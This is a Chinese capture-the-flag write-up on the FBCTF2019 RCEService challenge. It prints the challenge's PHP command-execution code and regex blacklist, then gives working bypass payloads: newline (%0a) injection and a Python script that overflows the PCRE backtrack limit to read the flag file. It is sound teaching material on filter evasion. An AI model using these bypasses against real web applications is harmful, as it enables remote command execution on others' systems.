---
title: FBCTF2019-RCEService1
date: 2025-03-30 19:12:39
tags:
- +%0a绕过单行匹配正则
- PCRE回溯次数绕过
category:
- 刷题笔记
---

# FBCTF2019-RCEService1

源码：

```
<?php
putenv('PATH=/home/rceservice/jail');
if (isset($_REQUEST['cmd'])) {
  $json = $_REQUEST['cmd'];
  
  if (!is_string($json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } else {
    echo 'Attempting to run command:<br/>';
    $cmd = json_decode($json, true)['cmd'];
    if ($cmd !== NULL) {
      system($cmd);
    } else {
      echo 'Invalid input';
    }
    echo '<br/><br/>';
  }
}
?>
```

代码中$cmd = json_decode($json, true)['cmd'];
json_decode(): 这个函数用于将JSON格式的字符串解码为PHP变量,参数 $json 是要被解码的 JSON 字符串,格式类似 {"cmd": "ls"}

json_decode第二个参数被设置为true,意味着json_decode函数将返回一个关联数组(array)而不是一个对象(object),把json_decode函数返回的关联数组中的'cmd'键对应的值赋值给变量$command

这里正则表达式明显过滤的非常严格,过滤了非常多东西,使用的格式是  ^.*(捕获组).*$

. 表示匹配任意单个字符(除了换行符) 

* 是量词，表示前面的元素可以出现0次或多次。

.* 表示匹配任意数量的任意字符(默认不会匹配换行符,需要修饰符才会匹配)

加上^ 变成 ^.*  表示从字符串的开始位置匹配任意数量的任意字符 

后面的  .*$  表示从当前位置匹配任意数量的任意字符，直到行尾

括号表示捕获组,可以在匹配过程中捕获一部分匹配的内容，并且可以在后续处理中引用这些被捕获的部分

注意到正则匹配中  [\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+  
\x00-\x1F  表示从 ASCII 码 0 到 31 的字符(控制字符),A-Z0-9 就是大写字母和数字,这里没有用修饰符i 没有过滤小写字母,后面的+表示可以匹配1次或多次

---

既然没有过滤小写字母我们试试

```
POST：
cmd={"cmd":"ls"}
```

发现成功回显index.php，但是传入{"cmd":"ls /"}就不行了因为/别过滤了

---

## 解法一 %0a绕过

正则表达式是 ^...$ 格式  如果没有修饰符m 那么^只会匹配第一行的内容,可以利用%0a换行符绕过
而且这里还用了.* 贪婪匹配  也没有修饰符s  所以 .* 也不会匹配换行符%0a
那么只需传入换行符%0a,那么就可以绕过 .* 从而绕过正则匹配
但是这里正则匹配表达式中 \x00-\x1F 过滤了ascii码 0-31 的控制字符,包含了换行符,因此%0a会被匹配

也就是说如果传入的命令是

```
{%0a"cmd":"/bin/cat /home/rceservice/flag"} 
```

此时 .* 匹配了最开始的左括号{  因为遇到%0a就不匹配了,然后正则表达式括号中的\x00-\x1F 匹配了换行符%0a  而后面的+表示可以匹配1次或多次,因此在%0a后面再多添加几个%0a也没用   最后的.* 匹配了"cmd":"/bin/cat /home/rceservice/flag"}  从而匹配成功,如下图所示

---

或者如果在字符串的 { 前面加上%0a 变成    %0a{"cmd":"/bin/cat /home/rceservice/flag"}
此时第一个.* 匹配的不是空null, 是空字符串"",因为*可以匹配0次或多次, \x00-\x1F 匹配了%0a   最后的.*匹配到字符串结束   从而也会匹配成功

---

但是如果我们构造这样的payload：

```
POST:
cmd={%0a"cmd":"ls /"%0a}
```

**此时.\* 匹配 {   而\x00-\x1F 匹配了第一个%0a 但是最后的 .\* 不能匹配换行符,因此也匹配不到换行后的 }  所以不能匹配到完整字符串,返回值为空,完成正则绕过**

payload：

```
cmd={%0a"cmd":"ls /home/rceservice"%0a}
发现flag

#cmd={%0a"cmd":"cat /home/rceservice/flag"%0a}	#没有回显，应该是环境变量配置被改变，所以需要使用/bin/cat调用命令

cmd={%0a"cmd":"/bin/cat /home/rceservice/flag"%0a}
```

得到flag

## 解法二 PCRE回溯次数绕过

PCRE回溯机制有一个回溯限制次数——大约100 万次,当回溯超出这个次数,还没吐完的字符串就可以逃逸绕过匹配
通过发送超长字符串的方式,使正则执行失败,让传入的参数逃逸,从而正常执行命令绕过限制

那么就传入一个json格式字符串,里面的键名为cmd,键值为执行的命令  
然后在payload后加上100万个字符即可,等匹配超过这个次数时语句自然就可以逃逸掉
使用python脚本

```
import requests

url = 'http://11f9f73e-7798-4724-a5b4-7316cfec570b.node5.buuoj.cn:81/'
data = {'cmd':'{"cmd":"/bin/cat /home/rceservice/flag", "abc":"'+'a'*1000000+'"}'}

res = requests.post(url,data=data)
print(res.text)
```

---





